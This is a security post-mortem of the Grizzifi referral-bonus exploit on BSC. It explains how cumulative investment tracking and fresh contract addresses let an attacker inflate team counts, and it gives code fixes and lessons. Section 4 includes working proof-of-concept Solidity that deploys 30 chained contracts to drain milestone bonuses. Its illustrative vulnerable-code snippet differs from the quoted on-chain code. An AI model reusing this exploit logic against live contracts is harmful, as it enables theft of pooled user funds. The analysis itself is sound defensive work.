# Grizzifi — Bonus Drain via Team Count Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-13 |
| **Protocol** | Grizzifi |
| **Chain** | BSC |
| **Loss** | ~61,000 USD |
| **Attacker** | [0xe2336b08a43f87a4ac8de7707ab7333ba4dbaf7c](https://bscscan.com/address/0xe2336b08a43f87a4ac8de7707ab7333ba4dbaf7c) |
| **Attack Tx** | [0x36438165](https://bscscan.com/tx/0x36438165d701c883fd9a03631ee0cdeec35a138153720006ab59264db7e075c1) |
| **Vulnerable Contract** | [0x21ab8943380b752306abf4d49c203b011a89266b](https://bscscan.com/address/0x21ab8943380b752306abf4d49c203b011a89266b) |
| **Root Cause** | `_incrementUplineTeamCount()` calculates team count using cumulative investment (including withdrawals) instead of active investment |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/Grizzifi_exp.sol) |

---

## 1. Vulnerability Overview

The Grizzifi investment protocol distributes milestone bonuses and referral bonuses based on the investment volume of an upline (referrer) team. The `_incrementUplineTeamCount()` function responsible for calculating team size uses `totalInvested` (cumulative amount including withdrawn funds) instead of the current active investment. By deploying 30 attack contracts, each repeatedly depositing a small amount and immediately withdrawing, the attacker artificially inflated the team count to claim bonuses.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: team count calculated using cumulative investment (including withdrawals)
function _incrementUplineTeamCount(address referrer, uint256 amount) internal {
    address upline = referrer;
    for (uint256 i = 0; i < 10; i++) {
        if (upline == address(0)) break;
        // ❌ totalInvested does not decrease after withdrawal
        if (userInfo[upline].totalInvested >= MILESTONE_THRESHOLD) {
            // Milestone reached, pay bonus
            _payMilestoneBonus(upline);
        }
        upline = userInfo[upline].referrer;
    }
}

// ✅ Fix: calculate using active investment (activeInvestment)
function _incrementUplineTeamCount(address referrer, uint256 amount) internal {
    address upline = referrer;
    for (uint256 i = 0; i < 10; i++) {
        if (upline == address(0)) break;
        // ✅ activeInvestment = totalInvested - totalWithdrawn
        if (userInfo[upline].activeInvestment >= MILESTONE_THRESHOLD) {
            _payMilestoneBonus(upline);
        }
        upline = userInfo[upline].referrer;
    }
}
```

### On-Chain Original Code

Source: **Sourcify-verified** (partial match) — Grizzifi / 0x21ab8943380B752306aBF4D49C203B011A89266B (BSC)
https://sourcify.dev/server/files/any/56/0x21ab8943380b752306abf4d49c203b011a89266b

```solidity
// From: Grizzifi.sol

uint256 public minInvestForMilestone = 10 * 1e18;  // 10 BSC-USD minimum to qualify
uint256 public minDirect = 2;                       // minimum direct referrals to claim milestone reward

uint256[] public teamMilestones = [20, 50, 100, 200, 500, 1000, 3000, 6000, 10000, 30000];
uint256[] public rewardAmounts   = [
    50 * 1e18, 120 * 1e18, 220 * 1e18, 440 * 1e18, 800 * 1e18,
    1600 * 1e18, 2500 * 1e18, 4500 * 1e18, 7500 * 1e18, 15000 * 1e18
];

mapping(address => User) public users;
// User.totalInvested: cumulative, never decremented on withdrawal
// User.teamsCount: number of unique sub-tree members counted by _incrementUplineTeamCount
// User.inTeam[addr]: tracks whether addr has already been counted for this upline

function harvestHoney(uint256 _planId, uint256 _amount, address _referrer) external {
    // ... registration logic ...
    if (_amount >= minInvestForMilestone) {
        _incrementUplineTeamCount(msg.sender); // ❌ called BEFORE updating totalInvested
    }
    // ... USDT transfer and investment storage ...
    users[msg.sender].totalInvested += _amount; // totalInvested grows but never shrinks
    totalInvested += _amount;
    emit NewInvestment(msg.sender, _planId, _amount, users[msg.sender].referrer);
}

function _incrementUplineTeamCount(address _user) internal {
    address upline = users[_user].referrer;
    for (uint8 i = 0; i < 30; i++) {
        if (upline == address(0)) break;

        if (users[upline].totalInvested >= minInvestForMilestone) { // ❌ totalInvested never decreases — always qualifies after first deposit
            if (!users[upline].inTeam[_user]) {
                if (i == 0 && !users[_user].inDirect) {
                    users[_user].inDirect = true;
                    users[upline].directCount++;
                }
                users[upline].inTeam[_user] = true; // ❌ inTeam[_user] only prevents the SAME _user from being counted twice
                users[upline].teamsCount++;          // ❌ but each new sub-contract is a fresh address → always inTeam=false

                uint256 index = users[upline].milestoneIndex;
                if (
                    index < teamMilestones.length &&
                    users[upline].teamsCount == teamMilestones[index]  // milestone triggered
                ) {
                    if (users[upline].directCount >= minDirect) {
                        uint256 reward = rewardAmounts[index];
                        users[upline].milestoneReward += reward;        // ❌ reward credited without active-balance check
                        users[upline].totalMilestoneEarned += reward;
                        emit MilestoneAchieved(upline, users[upline].milestoneIndex, reward);
                    }
                    users[upline].milestoneIndex++;
                }
            } else {
                break;
            }
        }
        upline = users[upline].referrer;
    }
}
```

**Why it is exploitable (identify the bug from the code):**
- `users[upline].totalInvested` is cumulative and never decremented when funds are withdrawn. An upline qualifies for team-count milestones after any historical investment of ≥ 10 BSC-USD, regardless of current balance.
- `inTeam[_user]` is keyed by the sub-member's address. The attacker deploys 30 fresh attack contracts; each one is a new address and therefore `inTeam[newContract] == false` for every upline — the deduplication guard is trivially bypassed.
- Each of the 30 contracts deposits 10 BSC-USD (reaching `minInvestForMilestone`), triggering `_incrementUplineTeamCount` up the 30-deep referrer chain. This inflates every upline's `teamsCount` to milestone thresholds, crediting `milestoneReward` without those uplines holding any meaningful active investment.
- After all 30 sub-contracts have deposited (and immediately withdrawn their own capital), `collectRefBonus()` drains the accumulated milestone rewards from the contract.

```solidity
// ✅ Fix: gate milestones on net active investment (totalInvested - totalWithdrawn)
if (users[upline].totalInvested >= users[upline].totalWithdrawn + minInvestForMilestone) {
    // upline currently has net active stake — milestone is legitimate
    users[upline].teamsCount++;
    // ... milestone reward logic ...
}
// Also: restrict contract addresses from registering as referrers:
// require(tx.origin == msg.sender || isApprovedContract[msg.sender], "no contract referrers");
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Deploy 30 AttackContract1s (each holding 20 BSC-USD)
  │
  ├─2─▶ Build chain structure (ac[0] referrer=0, ac[1] referrer=ac[0], ...)
  │         └─ Form 30-level upline chain
  │
  ├─3─▶ Execute each ac.init(GRIZZIFI, prevAC) in order:
  │         ├─ harvestHoney(planId=0, amount=10 BSC-USD, referrer=prevAC)
  │         └─ AttackContract2.run() → re-execute harvestHoney(10 BSC-USD)
  │         └─ totalInvested += 20 BSC-USD (persists even after withdrawal)
  │
  ├─4─▶ _incrementUplineTeamCount repeatedly triggered → milestones reached
  │         └─ Referral bonuses + milestone bonuses accumulate
  │
  └─5─▶ ac.withdraw(GRIZZIFI) × 30 → collectRefBonus() executed
         └─ Claim ~61,000 USD worth of BSC-USD bonuses
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract Grizzifi is BaseTestWithBalanceLog {
    address[] public attackContracts = new address[](30);

    function testExploit() public balanceLog {
        // Step 1: Deploy 30 attack contracts, fund each with 20 BSC-USD
        for (uint256 i = 0; i < 30; i++) {
            AttackContract1 ac1 = new AttackContract1();
            attackContracts[i] = address(ac1);
            IERC20(BSC_USD).transfer(address(ac1), 20 ether);
        }

        // Step 2: Execute harvestHoney in chain structure
        // Inflate totalInvested to reach team count milestones
        address regCenter = address(0);
        for (uint256 i = 0; i < 30; i++) {
            address ac1 = attackContracts[i];
            AttackContract1(ac1).init(GRIZZIFI, regCenter);
            regCenter = ac1;
        }

        // Step 3: Collect referral bonuses from each attack contract
        for (uint256 i = 0; i < 30; i++) {
            try AttackContract1(attackContracts[i]).withdraw(GRIZZIFI) {} catch {}
        }
    }
}

contract AttackContract1 {
    function init(address owner, address regCenter) public {
        IERC20 bscUsd = IERC20(BSC_USD);
        IGrizzifi grizzifi = IGrizzifi(owner);

        bscUsd.approve(owner, type(uint256).max);
        // Deposit 10 BSC-USD (totalInvested +10)
        grizzifi.harvestHoney(0, 10 ether, regCenter);

        // Sub-contract also deposits 10 BSC-USD (further increases team count)
        AttackContract2 ac2 = new AttackContract2();
        bscUsd.transfer(address(ac2), 10 ether);
        ac2.run(BSC_USD, owner, regCenter);
        // totalInvested = 20, but active balance is 0 after withdrawal
    }

    function withdraw(address token) public {
        IGrizzifi(token).collectRefBonus(); // Collect accumulated bonuses
        IERC20 bscUsd = IERC20(BSC_USD);
        bscUsd.transfer(msg.sender, bscUsd.balanceOf(address(this)));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Cumulative investment misuse (_incrementUplineTeamCount uses totalInvested, which does not decrease after withdrawal, as the team count baseline) |
| **Attack Vector** | Team count manipulation via cumulative investment + multiple contracts |
| **Impact Scope** | Entire bonus pool (~61,000 USD) |
| **CWE** | CWE-682 (Incorrect Calculation) |
| **DASP** | Business Logic |

## 6. Remediation Recommendations

1. **Calculate based on active balance**: Compute team count/milestones using `totalInvested - totalWithdrawn` (net active investment)
2. **Fix snapshot timing**: Verify milestone eligibility via snapshots taken after a set period
3. **Restrict contract addresses as referrers**: Prohibit contract address registration as referrer (check `tx.origin == msg.sender`)
4. **Sybil defense**: Detect patterns where the same EOA repeatedly deposits through multiple contracts

## 7. Lessons Learned

- "Cumulative investment" and "current active investment" are different — failing to distinguish between them creates a vulnerability where milestones persist even after withdrawal.
- Multi-level referral reward structures (MLM-like) are particularly vulnerable to Sybil attacks. If contracts can register as referrers, the attack scale can be fully automated.
- When bonus rewards far exceed the cost of deploying 30 contracts (gas fees), the attack becomes economically rational.